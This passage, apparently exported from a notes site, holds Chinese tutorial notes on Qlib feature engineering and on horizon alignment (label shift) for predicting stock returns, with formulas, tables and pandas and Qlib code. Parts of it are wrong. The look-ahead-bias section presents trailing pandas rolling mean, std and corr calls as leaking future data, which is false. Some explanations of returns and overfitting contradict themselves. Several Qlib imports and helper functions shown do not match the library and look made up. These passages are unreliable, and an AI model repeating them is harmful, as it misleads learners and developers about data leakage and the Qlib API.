\\forall t, \\text{Op}(X_t) = f(X_{&lt;t})\n系统会在算子定义时检查，违反约束的算子无法注册。\n防护2：表达式级验证\n表达式系统会自动验证因果性：\n# 正确表达式\nfactor = Mean($close, 20)  # 只使用t-19到t的数据\n \n# 错误表达式（系统会拒绝）\nfactor = Mean(Ref($close, -10), 20)  # 包含未来数据\n防护3：时间戳追踪\nQlib会追踪每个因子的时间戳，确保时间对齐正确：\n# 每个因子都有时间戳\nfactor = Mean($close, 20)\n# factor的时间戳 = t（使用t-19到t的数据）\n \nlabel = Ref($close, -5) / $close - 1\n# label的时间戳 = t（使用t到t+5的数据）\n防护4：回测一致性检查\nQlib提供回测一致性检查工具，检测潜在的数据泄漏：\n# 检查因子是否与未来价格相关\ncheck_lookahead_bias(factor, price)\n \n# 检查IC是否异常高\ncheck_ic_validity(ic_series)\n防护5：审计日志\nQlib会记录每个因子的计算过程，便于审计：\n[2024-01-01] Factor: ma20\n  Input: $close\n  Operation: Mean($close, 20)\n  Time range: [2023-12-10, 2024-01-01]\n  Causality check: ✓ Passed\n\n回测一致性的定义\n回测一致性指：历史回测的表现能够外推到实盘。\n如何保证回测一致性\nQlib通过以下机制保证：\n机制1：严格时序划分\n严格划分训练集、验证集、测试集，确保时间顺序：\nTrain: [t_1, t_2]\nValidate: [t_2, t_3]\nTest: [t_3, t_4]\n\n机制2：增量学习\n模型在每个时间点只使用历史数据学习，然后预测未来：\nfor t in time_grid:\n    # 使用t之前的数据训练\n    model.fit(X[:t], y[:t])\n \n    # 预测t之后的收益\n    pred[t] = model.predict(X[t:t+horizon])\n机制3：样本外验证\n严格使用样本外数据验证，绝不使用样本内数据调参：\n# 错误：使用全部数据调参\nbest_params = grid_search(X, y, param_grid)\n \n# 正确：只在训练集上调参\nbest_params = grid_search(X_train, y_train, param_grid)\n机制4：前瞻性预测\n预测未来的收益，而不是拟合过去的收益：\n# 正确：预测未来收益\npred = model.predict(current_features)\n \n# 错误：拟合过去收益\npred = model.predict(historical_features)  # 这是过拟合\n\n5. 适用场景与局限性\n5.1 适用场景清单\nQlib特征工程在以下场景中表现优异：\n场景1：多因子选股\n这是Qlib最核心的应用场景。多因子选股的核心思想是：\n\n构建多个因子（动量、价值、质量、波动等）\n通过因子组合选出表现最好的股票\n定期调仓（如每月、每季度）\n\nQlib的优势：\n\n表达式系统快速定义和测试因子\n横截面标准化和中性化自动处理风格因子\nIC/IR评估系统量化因子质量\n\n示例：\n# 定义5个因子\nfactors = {\n    &#039;momentum&#039;: ($close / Ref($close, 20)) - 1,\n    &#039;value&#039;: 1 / $pe_ratio,\n    &#039;quality&#039;: $roe / $debt_ratio,\n    &#039;volatility&#039;: Std($return, 20),\n    &#039;liquidity&#039;: $turnover_rate\n}\n \n# 横截面标准化\nfactors_z = zscore_cross_sectional(factors)\n \n# 中性化\nfactors_neu = neutralize(factors_z, industry, market_cap)\n \n# 组合\ncomposite_factor = 0.3 * factors_neu[&#039;momentum&#039;] + \\\n                   0.3 * factors_neu[&#039;value&#039;] + \\\n                   0.2 * factors_neu[&#039;quality&#039;] + \\\n                   0.1 * factors_neu[&#039;volatility&#039;] + \\\n                   0.1 * factors_neu[&#039;liquidity&#039;]\n \n# 选股（Top 10%）\nselected = rank(composite_factor) &gt; 0.9\n场景2：CTA策略因子构建\nCTA（Commodity Trading Advisor）策略主要基于趋势跟踪，Qlib的表达式系统非常适合构建趋势因子。\nQlib的优势：\n\n表达式系统方便定义趋势指标（MA、MACD、RSI等）\n时间结构层支持Rolling、Lag、Decay等操作\n可以快速测试不同参数的稳健性\n\n示例：\n# 趋势因子\ntrend_factor = ($close - Mean($close, 60)) / Mean($close, 60)\n \n# 动量因子\nmomentum_factor = ($close / Ref($close, 20)) - 1\n \n# 波动率因子\nvolatility_factor = Std($return, 20)\n \n# 组合\ncta_factor = 0.5 * trend_factor + 0.3 * momentum_factor - 0.2 * volatility_factor\n \n# 交易信号\nlong_signal = cta_factor &gt; threshold\nshort_signal = cta_factor &lt; -threshold\n场景3：因子库管理\n对于量化团队，管理数百个因子是一个挑战。Qlib提供了系统的因子库管理方案。\nQlib的优势：\n\n表达式系统统一因子定义\n因子评估系统（IC/IR/衰减周期）\n因子组合和去重\n因子监控和预警\n\n示例：\n# 因子库\nfactor_library = {\n    &#039;ma_cross&#039;: Mean($close, 5) / Mean($close, 20) - 1,\n    &#039;rsi&#039;: RSI($close, 14),\n    &#039;boll_width&#039;: (Mean($close, 20) + 2*Std($close, 20) - \\\n                   (Mean($close, 20) - 2*Std($close, 20))) / Mean($close, 20),\n    # ... 更多因子\n}\n \n# 批量评估\nfactor_performance = {}\nfor name, expr in factor_library.items():\n    ic_series = compute_ic(expr)\n    factor_performance[name] = {\n        &#039;ic_mean&#039;: ic_series.mean(),\n        &#039;ic_std&#039;: ic_series.std(),\n        &#039;ir&#039;: ic_series.mean() / ic_series.std()\n    }\n \n# 筛选优质因子\ngood_factors = [name for name, perf in factor_performance.items()\n                if perf[&#039;ir&#039;] &gt; 0.7]\n场景4：学术研究\nQlib也适合学术界进行量化研究，特别是因子挖掘和资产定价研究。\nQlib的优势：\n\n开源免费，可复现性强\n表达式系统灵活，便于实验\n内置常用因子库\n支持自定义算子\n\n场景5：链上数据分析\n随着DeFi和Web3的发展，链上数据量激增，Qlib的特征工程框架也可以用于链上数据分析。\nQlib的优势：\n\n表达式系统可以定义链上行为因子\n时间结构层支持高频数据分析\n横截面层可以比较不同Token/协议的表现\n\n详见文档5。\n\n5.2 局限性与替代方案\n局限性1：不适合纯深度学习端到端\nQlib的特征工程基于人工设计的因子，如果使用深度学习进行端到端学习，Qlib可能不是最优选择。\n原因：\n\n深度学习（如Transformer、LSTM）可以从原始序列中自动提取特征\nQlib的因子定义可能限制了模型的学习能力\n深度学习更适合高频、微观结构数据\n\n替代方案：\n\n使用PyTorch/TensorFlow搭建端到端深度学习模型\n使用专业的深度学习量化框架（如DeepQuant、FinRL）\n\n局限性2：高频微秒级策略\n对于微秒级的高频策略，Qlib的性能可能不够。\n原因：\n\nQlib基于表达式系统，计算开销较大\n没有针对实时流数据的优化\n横截面操作在N很大时性能瓶颈明显\n\n替代方案：\n\n使用C++编写的高频交易系统\n使用专业的实时数据流处理框架（如Flink、Kafka Streams）\n\n局限性3：复杂结构数据\nQlib主要处理时序数据，对于复杂结构数据（如图谱、文本、图像）支持有限。\n原因：\n\nQlib的数据结构是[时间, 资产, 因子]的三维张量\n不支持图谱、树、图等结构数据\n没有内置自然语言处理或计算机视觉模块\n\n替代方案：\n\n图谱数据：使用图神经网络（GNN）\n文本数据：使用NLP模型（如BERT、GPT）\n图像数据：使用CNN或Vision Transformer\n\n局限性4：实时流数据处理\nQlib的设计主要是批处理，对于实时流数据支持不足。\n原因：\n\nQlib的计算图是静态的，不支持动态更新\n没有内置流式处理机制\n横截面操作需要等待所有数据到达\n\n替代方案：\n\n使用流式处理框架（如Apache Flink、Apache Spark Streaming）\n使用专业的实时数据平台（如Kafka、Pulsar）\n\n局限性5：多市场、多资产类别\nQlib主要针对单一市场（如A股），对于跨市场、多资产类别的场景支持有限。\n原因：\n\n不同市场的交易时间、币种、规则不同\n多资产类别（股票、债券、期货、期权、加密货币）的数据结构差异大\n横截面操作需要处理不同资产类别的差异\n\n替代方案：\n\n使用专门的多资产管理系统（如Bloomberg、Wind）\n自研多市场数据平台\n\n\n总结\nQlib特征工程是一个专为量化投资设计的系统化框架，它通过四层架构解决了金融时序数据的三大核心挑战：非平稳性、自相关性和低信噪比。\n核心要点回顾：\n\n四层架构：原始字段层 → 表达式层 → 时间结构层 → 横截面层\nPipeline形式化：\\mathcal{F} = \\mathcal{N} \\circ \\mathcal{C} \\circ \\mathcal{T} \\circ \\mathcal{E}(\\mathcal{D}_{\\text{raw}})\n三大核心问题：因子定义、时间&amp;横截面对齐、数据泄漏防护\n适用场景：多因子选股、CTA策略、因子库管理、学术研究、链上数据分析\n局限性：不适合端到端深度学习、微秒级高频、复杂结构数据、实时流处理、多市场\n\nQlib的独特价值：\nQlib不是简单的特征工程库，而是一个可审计的计算图系统，它强制你在设计特征时就考虑因果性、时序对齐和回测一致性，从而避免量化研究中最致命的”未来函数”陷阱。\n在下一文档中，我们将深入探讨Qlib特征工程中最核心的操作：Horizon对齐（Label Shift），这是量化投资中”消除未来函数并建立因果预测关系”的关键技术。"},"quant/qlib/week1/02-horizon对齐详解":{"slug":"quant/qlib/week1/02-horizon对齐详解","filePath":"quant/qlib/week1/02-horizon对齐详解.md","title":"02-horizon对齐详解","links":[],"tags":[],"content":"Horizon对齐（Label Shift）详解\n引言\n在量化投资和机器学习建模中，“Horizon对齐”（Horizon Alignment，又称Label Shift）是一个最基础、最核心，却最容易被误解的概念。它解决的是量化投资中最根本的问题：\n“我现在的因子，如何对应未来的收益？”\n简单来说，Horizon对齐就是消除”未来函数”并建立因果预测关系。\n本文将从数学定义、详细示例、实现对比、不同Horizon的影响、常见错误陷阱等多个维度，全面解析Horizon对齐的原理与实践。\n\n1. 核心概念与数学定义\n1.1 Horizon的定义\n**Horizon（预测时长/视界）**是指从当前时刻 t 到未来时刻 t+h 的时间跨度，记为 h。\n常见的Horizon设置：\n\nh=1：预测未来1天（日频）\nh=5：预测未来5天（周频）\nh=20：预测未来20天（月频）\nh=60：预测未来60天（季频）\n\nHorizon的选择取决于：\n\n交易频率：高频交易 h 较小，低频投资 h 较大\n因子类型：动量因子 h 较小，价值因子 h 较大\n持仓周期：短线策略 h 较小，长线策略 h 较大\n\n1.2 收益率的数学定义\n离散收益率（Simple Return）\n从 t 时刻到 t+h 时刻的收益率定义为：\nR_{t \\to t+h} = \\frac{P_{t+h} - P_t}{P_t}\n其中：\n\nP_t：t 时刻的价格\nP_{t+h}：t+h 时刻的价格\nR_{t \\to t+h}：从 t 到 t+h 的收益率\n\n对数收益率（Log Return）\n对数收益率具有可加性，是量化研究中常用的形式：\nr_{t \\to t+h} = \\ln\\left(\\frac{P_{t+h}}{P_t}\\right) = \\ln(P_{t+h}) - \\ln(P_t)\n两者的关系\n当收益率较小时（|R| \\ll 1），对数收益率约等于离散收益率：\nr \\approx R\n推导（泰勒展开）：\n\\ln(1+R) = R - \\frac{R^2}{2} + \\frac{R^3}{3} - \\cdots \\approx R\n优势对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n收益率类型优势劣势离散收益率直观、易懂不可加（跨时间）对数收益率可加、对称性解释性稍差\n可加性示例\n假设有3天的价格：P_1=100, P_2=110, P_3=121\n离散收益率：\nR_{1 \\to 2} = (110-100)/100 = 10\\%\nR_{2 \\to 3} = (121-110)/110 = 10\\%\nR_{1 \\to 3} = (121-100)/100 = 21\\% \\neq R_{1 \\to 2} + R_{2 \\to 3}\n对数收益率：\nr_{1 \\to 2} = \\ln(110/100) = 0.0953\nr_{2 \\to 3} = \\ln(121/110) = 0.0953\nr_{1 \\to 3} = \\ln(121/100) = 0.1906 = r_{1 \\to 2} + r_{2 \\to 3} \\quad \\checkmark\n1.3 Label Shift的推导过程\n问题提出\n在量化回测或机器学习建模中：\n\n因子（Factor/Feature）：是我们在 t 时刻就能观察到的数据（如：t 时刻的收盘价、PE、成交量等）\n收益率（Label/Target）：是我们要预测的目标，通常是从 t 时刻到未来 t+h 时刻的涨跌幅\n\n问题是：如何将”当前的因子”与”未来的收益”对齐到同一行数据中？\n错误的对齐方式（Look-ahead Bias）\n\\text{Row}_t = \\{ \\underbrace{\\text{Factor}_t}_{\\text{t时刻可观测}}, \\underbrace{\\text{Return}_t}_{\\text{t时刻收益（已实现）}} \\}\n问题分析：\n\n\\text{Return}_t 是 t 时刻到 t-1 时刻的收益（已实现）\n在 t 时刻，我们不知道 \\text{Return}_t（要等到 t+1 时刻才知道）\n如果用 \\text{Return}_t 训练模型，模型会”看到未来”，这是Look-ahead Bias\n\n正确的对齐方式（Label Shift）\n\\text{Row}_t = \\{ \\underbrace{\\text{Factor}_t}_{\\text{t时刻可观测}}, \\underbrace{\\text{Return}_{t \\to t+h}}_{\\text{未来h期收益}} \\}\n其中：\n\\text{Return}_{t \\to t+h} = \\frac{P_{t+h}}{P_t} - 1\nLabel Shift的操作\nLabel Shift的本质是将 t+h 时刻才产生的收益率，“平移”到 t 时刻的因子行上：\n\\text{Label}_t = \\text{Return}_{t \\to t+h}\n时序因果约束\nHorizon对齐必须满足时序因果约束：\n\\text{Factor}_t \\leftarrow \\text{Label}_{t \\to t+h} \\quad \\checkmark\n\\text{Factor}_{t+1} \\leftarrow \\text{Label}_{t \\to t+h} \\quad \\times\n约束解释：\n\n在 t 时刻，我们可以观测到 \\text{Factor}_t\n在 t 时刻，我们预测的是 \\text{Label}_{t \\to t+h}（未来收益）\n不能在 t 时刻预测 \\text{Label}_{t \\to t+h}（这已经是过去的收益）\n\n1.4 Dataset形式化表示\n训练集构造\n整个训练集可以形式化为：\n\\mathcal{D} = \\{ (\\mathbf{X}_t, y_{t+h}) \\mid t = 1, 2, \\dots, T-h \\}\n其中：\n\n\\mathbf{X}_t \\in \\mathbb{R}^{N \\times F}：t 时刻 N 个资产的 F 个因子\ny_{t+h} \\in \\mathbb{R}^N：t+h 时刻 N 个资产的收益\nT：总时间长度\nN：资产数量\nF：因子数量\n\n维度解释\n时间维度（Time）：\n\n训练集时间范围：[t_1, t_{T-h}]\n标签时间范围：[t_{1+h}, t_T]\n注意：训练集最后 h 个时刻没有标签（因为未来数据不存在）\n\n资产维度（Number of instruments）：\n\n横截面：每个时刻有 N 个资产\n模型可以学习”同一时刻不同资产之间的关系”（横截面信息）\n\n因子维度（Factors）：\n\n每个资产有 F 个因子\n模型可以学习”同一资产不同因子之间的关系”（时序信息）\n\n矩阵形式\n特征矩阵 \\mathbf{X} \\in \\mathbb{R}^{(T-h) \\times N \\times F}：\n\\mathbf{X}_1 \\\\\n\\mathbf{X}_2 \\\\\n\\vdots \\\\\n\\mathbf{X}_{T-h}\n\\end{bmatrix} = \\begin{bmatrix}\n\\begin{bmatrix}x_{1,1,1} &amp; \\cdots &amp; x_{1,1,F} \\\\ \\vdots &amp; \\ddots &amp; \\vdots \\\\ x_{1,N,1} &amp; \\cdots &amp; x_{1,N,F}\\end{bmatrix} \\\\\n\\begin{bmatrix}x_{2,1,1} &amp; \\cdots &amp; x_{2,1,F} \\\\ \\vdots &amp; \\ddots &amp; \\vdots \\\\ x_{2,N,1} &amp; \\cdots &amp; x_{2,N,F}\\end{bmatrix} \\\\\n\\vdots \\\\\n\\begin{bmatrix}x_{T-h,1,1} &amp; \\cdots &amp; x_{T-h,1,F} \\\\ \\vdots &amp; \\ddots &amp; \\vdots \\\\ x_{T-h,N,1} &amp; \\cdots &amp; x_{T-h,N,F}\\end{bmatrix}\n\\end{bmatrix} $$\n\n**标签矩阵** $\\mathbf{Y} \\in \\mathbb{R}^{(T-h) \\times N}$：\n$$ \\mathbf{Y} = \\begin{bmatrix}\ny_{1+h} \\\\\ny_{2+h} \\\\\n\\vdots \\\\\ny_T\n\\end{bmatrix} = \\begin{bmatrix}\ny_{1+h,1} &amp; \\cdots &amp; y_{1+h,N} \\\\\ny_{2+h,1} &amp; \\cdots &amp; y_{2+h,N} \\\\\n\\vdots &amp; \\ddots &amp; \\vdots \\\\\ny_{T,1} &amp; \\cdots &amp; y_{T,N}\n\\end{bmatrix} $$\n\n**对齐关系**\n\n$$ \\mathbf{X}_t \\leftrightarrow y_{t+h} $$\n\n其中 $t = 1, 2, \\dots, T-h$。\n\n---\n\n## 2. 详细示例演示\n\n### 2.1 原始数据表\n\n假设我们有某只股票3天的价格数据：\n\n| 日期 (t) | 收盘价 (Price) | 因子值 (Factor) |\n|---------|---------------|-----------------|\n| 2023-01-01 | 100 | 1.5 |\n| 2023-01-02 | 105 | 1.6 |\n| 2023-01-03 | 103 | 1.4 |\n\n**解释**：\n- 01-01：价格100，因子1.5\n- 01-02：价格105，因子1.6\n- 01-03：价格103，因子1.4\n\n### 2.2 Step 1：计算收益率\n\n假设我们要预测未来1天的收益率（$h=1$）。\n\n**计算公式**：\n\n$$ R_{t \\to t+1} = \\frac{P_{t+1} - P_t}{P_t} $$\n\n**计算过程**：\n\n**01-01 到 01-02**：\n$$ R_{1 \\to 2} = \\frac{105 - 100}{100} = 5\\% $$\n\n**01-02 到 01-03**：\n$$ R_{2 \\to 3} = \\frac{103 - 105}{105} = -1.9\\% $$\n\n**收益率表**：\n\n| 日期 (t) | 收盘价 (Price) | 因子值 (Factor) | 收益率 (Return) |\n|---------|---------------|-----------------|-----------------|\n| 2023-01-01 | 100 | 1.5 | 5% |\n| 2023-01-02 | 105 | 1.6 | -1.9% |\n| 2023-01-03 | 103 | 1.4 | NaN |\n\n**注意**：01-03没有收益率，因为还没有01-04的数据。\n\n### 2.3 Step 2：Label Shift\n\n现在我们需要将未来的收益率对齐到当前时刻。\n\n**对齐规则**：\n\n$$ \\text{Label}_t = R_{t \\to t+1} $$\n\n**对齐过程**：\n\n**01-01**：\n- 因子：1.5\n- 对齐的标签：$R_{1 \\to 2} = 5\\%$（01-01预测01-02的收益）\n\n**01-02**：\n- 因子：1.6\n- 对齐的标签：$R_{2 \\to 3} = -1.9\\%$（01-02预测01-03的收益）\n\n**01-03**：\n- 因子：1.4\n- 对齐的标签：NaN（没有未来数据）\n\n**对齐后的数据表**：\n\n| 日期 (t) | 因子值 (Factor) | 标签 (Label) |\n|---------|-----------------|-------------|\n| 2023-01-01 | 1.5 | 5% |\n| 2023-01-02 | 1.6 | -1.9% |\n| 2023-01-03 | 1.4 | NaN |\n\n**解读**：\n\n- 01-01：用因子1.5预测未来1天的收益（5%）\n- 01-02：用因子1.6预测未来1天的收益（-1.9%）\n- 01-03：没有未来数据，无法预测（删除或填充）\n\n**Pandas代码实现**：\n\n```python\nimport pandas as pd\n\n# 原始数据\ndf = pd.DataFrame({\n    &#039;date&#039;: [&#039;2023-01-01&#039;, &#039;2023-01-02&#039;, &#039;2023-01-03&#039;],\n    &#039;price&#039;: [100, 105, 103],\n    &#039;factor&#039;: [1.5, 1.6, 1.4]\n})\n\n# 计算收益率\ndf[&#039;return&#039;] = df[&#039;price&#039;].pct_change(1)\n\n# Label Shift（向上移动h行）\nh = 1\ndf[&#039;label&#039;] = df[&#039;return&#039;].shift(-h)\n\n# 清理缺失值\ndf_clean = df.dropna(subset=[&#039;label&#039;])\n\nprint(df_clean[[&#039;date&#039;, &#039;factor&#039;, &#039;label&#039;]])\n```\n\n**输出**：\n\n```\n        date  factor  label\n0 2023-01-01     1.5   0.05\n1 2023-01-02     1.6  -0.019\n```\n\n### 2.4 不同Horizon对比\n\n**Horizon = 1（预测未来1天）**\n\n| 日期 (t) | 因子 | 标签（Label） |\n|---------|------|-------------|\n| 01-01 | 1.5 | 5% |\n| 01-02 | 1.6 | -1.9% |\n\n**解读**：\n- 用01-01的因子（1.5）预测01-01到01-02的收益（5%）\n- 用01-02的因子（1.6）预测01-02到01-03的收益（-1.9%）\n\n**Horizon = 5（预测未来5天）**\n\n假设我们有更长时间的数据：\n\n| 日期 | 价格 |\n|------|------|\n| 01-01 | 100 |\n| 01-02 | 105 |\n| 01-03 | 103 |\n| 01-04 | 107 |\n| 01-05 | 110 |\n| 01-06 | 115 |\n\n**计算收益率**：\n\n$$ R_{1 \\to 6} = \\frac{115 - 100}{100} = 15\\% $$\n$$ R_{2 \\to 7} = \\text{未知} $$\n$$ \\vdots $$\n\n**Label Shift**：\n\n| 日期 (t) | 因子 | 标签（Label） |\n|---------|------|-------------|\n| 01-01 | 1.5 | 15% |\n| 01-02 | 1.6 | NaN |\n\n**解读**：\n- 用01-01的因子（1.5）预测01-01到01-06的收益（15%）\n- 01-02没有未来5天的数据（如果数据只有到01-06）\n\n**Horizon = 20（预测未来20天）**\n\n类似地，计算20天的收益率，然后向上移动20行。\n\n**不同Horizon的影响**：\n\n| Horizon | 信号时效性 | IC均值 | 噪声水平 | 适用场景 |\n|---------|-----------|--------|---------|---------|\n| 1 | 极强 | 0.02-0.05 | 极高 | 高频交易 |\n| 5 | 强 | 0.05-0.08 | 高 | 短线策略 |\n| 20 | 中 | 0.08-0.12 | 中 | 中线策略 |\n| 60 | 弱 | 0.12-0.15 | 低 | 长线策略 |\n\n**趋势**：\n- Horizon越大，IC通常越高（因为长期趋势更清晰）\n- Horizon越大，信号时效性越差（因为未来信息太多）\n\n---\n\n## 3. 实现代码对比\n\n### 3.1 Pandas实现\n\n**核心代码**：\n\n```python\nimport pandas as pd\n\n# 计算收益率\ndf[&#039;return&#039;] = df[&#039;price&#039;].pct_change(h)\n\n# Label Shift（向上移动h行）\ndf[&#039;label&#039;] = df[&#039;return&#039;].shift(-h)\n\n# 清理缺失值\ndf = df.dropna(subset=[&#039;label&#039;])\n```\n\n**完整示例**：\n\n```python\nimport pandas as pd\nimport numpy as np\n\n# 模拟数据\nnp.random.seed(42)\ndates = pd.date_range(&#039;2020-01-01&#039;, &#039;2023-12-31&#039;)\nn = len(dates)\nprices = 100 * np.cumprod(1 + np.random.randn(n) * 0.01)\nfactors = np.random.randn(n) * 0.1\n\ndf = pd.DataFrame({\n    &#039;date&#039;: dates,\n    &#039;price&#039;: prices,\n    &#039;factor&#039;: factors\n})\n\n# 设置Horizon\nh = 5\n\n# Step 1: 计算收益率\ndf[&#039;return&#039;] = df[&#039;price&#039;].pct_change(h)\n\n# Step 2: Label Shift\ndf[&#039;label&#039;] = df[&#039;return&#039;].shift(-h)\n\n# Step 3: 清理缺失值\ndf_clean = df.dropna(subset=[&#039;label&#039;])\n\n# 验证对齐\nprint(f&quot;原始数据量: {len(df)}&quot;)\nprint(f&quot;对齐后数据量: {len(df_clean)}&quot;)\nprint(f&quot;损失数据量: {len(df) - len(df_clean)}&quot;)\nprint(f&quot;数据损失率: {(len(df) - len(df_clean)) / len(df):.2%}&quot;)\n\n# 验证对齐正确性\nsample = df_clean.iloc[0]\nprint(f&quot;\\n示例验证:&quot;)\nprint(f&quot;日期: {sample[&#039;date&#039;]}&quot;)\nprint(f&quot;因子: {sample[&#039;factor&#039;]:.4f}&quot;)\nprint(f&quot;标签: {sample[&#039;label&#039;]:.4f}&quot;)\nprint(f&quot;验证: {sample[&#039;label&#039;]:.4f} ≈ {(df.loc[df[&#039;date&#039;] == sample[&#039;date&#039;] + pd.Timedelta(days=h), &#039;price&#039;].values[0] / sample[&#039;price&#039;] - 1):.4f}&quot;)\n```\n\n**输出示例**：\n\n```\n原始数据量: 1096\n对齐后数据量: 1091\n损失数据量: 5\n数据损失率: 0.46%\n\n示例验证:\n日期: 2020-01-01 00:00:00\n因子: 0.0046\n标签: 0.0492\n验证: 0.0492 ≈ 0.0492\n```\n\n### 3.2 Qlib实现\n\n**核心代码**：\n\n```python\nfrom qlib import Expression\nfrom qlib.data import D\n\n# 定义因子\nfactor_expr = Expression($close / Ref($close, 1) - 1)\n\n# 定义Label（Horizon对齐）\nlabel_expr = Expression(Ref($close, -h) / $close - 1)\n\n# 加载数据（自动对齐）\nfeatures = D.features([factor_expr], start_time, end_time)\nlabels = D.features([label_expr], start_time, end_time)\n```\n\n**完整示例**：\n\n```python\nfrom qlib import init\nfrom qlib.data import D\nfrom qlib.expr import Expression\nimport pandas as pd\n\n# 初始化Qlib\ninit(provider_uri=&quot;data/qlib/qlib_data/cn_data&quot;)\n\n# 定义时间范围\nstart_time = &quot;2020-01-01&quot;\nend_time = &quot;2023-12-31&quot;\n\n# 定义Horizon\nh = 5\n\n# 定义因子（示例：动量因子）\nfactor_expr = Expression(\n    ($close / Ref($close, 1)) - 1\n)\n\n# 定义Label（Horizon对齐）\nlabel_expr = Expression(\n    Ref($close, -h) / $close - 1\n)\n\n# 加载数据（Qlib自动对齐）\ninstruments = D.instruments(market=&quot;all&quot;)\nfeatures = D.features(\n    instruments,\n    [factor_expr],\n    start_time=start_time,\n    end_time=end_time\n)\nlabels = D.features(\n    instruments,\n    [label_expr],\n    start_time=start_time,\n    end_time=end_time\n)\n\n# 验证对齐\nprint(f&quot;特征矩阵形状: {features.shape}&quot;)  # [T, N, 1]\nprint(f&quot;标签矩阵形状: {labels.shape}&quot;)    # [T, N, 1]\n\n# 提取单只股票\nstock = &quot;000001.SZ&quot;\nfeature_series = features.xs(stock, level=&quot;instrument&quot;).iloc[:, 0]\nlabel_series = labels.xs(stock, level=&quot;instrument&quot;).iloc[:, 0]\n\n# 验证对齐正确性\nidx = feature_series.index[0]\nprint(f&quot;\\n示例验证:&quot;)\nprint(f&quot;股票: {stock}&quot;)\nprint(f&quot;日期: {idx}&quot;)\nprint(f&quot;因子: {feature_series[idx]:.4f}&quot;)\nprint(f&quot;标签: {label_series[idx]:.4f}&quot;)\n```\n\n**Qlib的优势**：\n- 自动处理时间对齐\n- 支持表达式系统\n- 高效的增量计算\n- 自动处理缺失值\n\n### 3.3 实现对比总结\n\n| 维度 | Pandas | Qlib |\n|------|--------|------|\n| **易用性** | 中等 | 高（表达式系统） |\n| **性能** | 低（逐列计算） | 高（增量计算） |\n| **灵活性** | 高（任意操作） | 中等（算子约束） |\n| **可维护性** | 低（代码分散） | 高（声明式） |\n| **可回测性** | 低（易泄漏） | 高（强制因果） |\n\n---\n\n## 4. 不同Horizon的影响分析\n\n### 4.1 短期（h=1）：高频噪声问题\n\n**优势**：\n- 信号时效性强：模型学到的是&quot;最近&quot;的信息\n- 适合高频交易：可以快速调整持仓\n- 交易机会多：每天都有新的预测\n\n**劣势**：\n- 日内噪声严重：短期价格波动主要由随机噪声驱动\n- IC波动大：因子表现不稳定，今天IC=0.05，明天IC=-0.02\n- 交易成本高：频繁交易导致交易成本侵蚀收益\n\n**IC分析**：\n\n假设因子IC均值=0.03，标准差=0.1：\n\n$$ \\text{IR} = \\frac{0.03}{0.1} = 0.3 $$\n\nIR &lt; 0.5，说明因子不稳定。\n\n**适用场景**：\n- 高频交易（分钟级、秒级）\n- 市场中性策略（对冲市场风险）\n- 流动性好的市场（如美股）\n\n**不适用场景**：\n- 流动性差的市场（如小盘股、新兴市场）\n- 交易成本高的策略（如期权、期货）\n- 长线投资\n\n### 4.2 中期（h=5）：信号稳定性\n\n**优势**：\n- 信号稳定性好：IC均值较高，波动较小\n- 噪声相对可控：5天内的价格波动有一定趋势\n- 适合量化选股：可以选出表现较好的股票\n\n**劣势**：\n- 周期性效应：可能受周效应、月效应影响\n- 持仓周期中等：需要定期调仓（如每周调仓）\n\n**IC分析**：\n\n假设因子IC均值=0.05，标准差=0.08：\n\n$$ \\text{IR} = \\frac{0.05}{0.08} = 0.625 $$\n\nIR &gt; 0.5，说明因子可用。\n\n**适用场景**：\n- 量化选股（A股多因子策略）\n- 市场中性对冲基金\n- 指数增强\n\n### 4.3 长期（h=20）：趋势主导\n\n**优势**：\n- 趋势信号清晰：20天的价格波动主要由基本面驱动\n- IC较高：长期来看，因子与收益相关性更强\n- 适合价值投资：低频交易，交易成本低\n\n**劣势**：\n- 对基本面变化反应慢：需要较长时间才能识别基本面变化\n- 持仓周期长：需要长时间持有，可能错过短期机会\n- 市场风格切换：如果市场风格切换，因子可能失效\n\n**IC分析**：\n\n假设因子IC均值=0.08，标准差=0.06：\n\n$$ \\text{IR} = \\frac{0.08}{0.06} = 1.33 $$\n\nIR &gt; 1.0，说明因子非常稳定。\n\n**适用场景**：\n- 价值投资（低PE、高ROE）\n- 基本面投资\n- 长线基金\n\n### 4.4 Horizon选择建议\n\n**根据因子类型选择**：\n\n| 因子类型 | 推荐Horizon | 原因 |\n|---------|-------------|------|\n| 动量因子 | 1-5天 | 动量效应短期存在 |\n| 均值回归 | 5-20天 | 均值回归需要一定时间 |\n| 价值因子 | 20-60天 | 价值发现需要时间 |\n| 质量因子 | 20-60天 | 质量效应长期存在 |\n\n**根据交易频率选择**：\n\n| 交易频率 | 推荐Horizon | 原因 |\n|---------|-------------|------|\n| 高频（分钟级） | 1-5天 | 需要快速调整 |\n| 中频（日频） | 5-20天 | 平衡时效性和稳定性 |\n| 低频（周频/月频） | 20-60天 | 长线持有 |\n\n**根据市场特征选择**：\n\n| 市场特征 | 推荐Horizon | 原因 |\n|---------|-------------|------|\n| 流动性好 | 1-5天 | 可以快速调仓 |\n| 流动性差 | 20-60天 | 降低交易成本 |\n| 有效性高 | 20-60天 | 长期趋势清晰 |\n| 有效性低 | 1-5天 | 捕捉短期机会 |\n\n---\n\n## 5. 常见错误与调试\n\n### 5.1 Look-ahead Bias典型案例\n\n**案例1：未来均值**\n\n**错误代码**：\n\n```python\n# 计算20日均值，包含未来数据\ndf[&#039;ma20&#039;] = df[&#039;price&#039;].rolling(20).mean()\n\n# 问题：在t时刻，ma20包含了t+1到t+19的数据\n```\n\n**正确代码**：\n\n```python\n# 计算t-19到t的均值\ndf[&#039;ma20&#039;] = df[&#039;price&#039;].rolling(20, min_periods=20).mean().shift(1)\n```\n\n**案例2：未来波动率**\n\n**错误代码**：\n\n```python\n# 计算20日波动率，包含未来数据\ndf[&#039;volatility&#039;] = df[&#039;return&#039;].rolling(20).std()\n```\n\n**正确代码**：\n\n```python\n# 只用历史数据计算波动率\ndf[&#039;volatility&#039;] = df[&#039;return&#039;].rolling(20, min_periods=20).std().shift(1)\n```\n\n**案例3：未来相关性**\n\n**错误代码**：\n\n```python\n# 计算与市场的相关性，包含未来数据\ndf[&#039;correlation&#039;] = df[&#039;return&#039;].rolling(20).corr(market_return)\n```\n\n**正确代码**：\n\n```python\n# 只用历史数据计算相关性\ndf[&#039;correlation&#039;] = df[&#039;return&#039;].rolling(20, min_periods=20).corr(market_return).shift(1)\n```\n\n### 5.2 检测方法\n\n**方法1：IC突然变高**\n\n如果训练集IC=0.05，但回测IC=0.5，说明可能存在Look-ahead 